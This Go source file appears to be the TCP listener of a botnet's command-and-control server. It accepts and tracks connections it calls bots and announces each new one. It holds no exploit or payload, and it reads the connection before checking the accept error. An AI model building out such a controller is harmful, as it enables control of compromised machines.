package server

import (
	"homo/network/config"
	"net"
	"os"
	"strconv"

	"github.com/fatih/color"
)

var (
	Conns  []net.Conn
	Chconn = make(chan net.Conn)
	List   []string
)

func StartServer(c *config.Config) {
	server, err := net.Listen("tcp", c.Bot.Server+":"+c.Bot.Port)
	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}
	go Ping()

	go func() {
		for {
			conn, err := server.Accept()
			if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
				List = append(List, addr.IP.String()+":"+strconv.Itoa(addr.Port))
			}

			if err != nil {
				continue
			}
			Conns = append(Conns, conn)
			Chconn <- conn
		}
	}()

	for {
		select {
		case <-Chconn:
			color.HiYellow("[!] New bot connected")
		}
	}

}
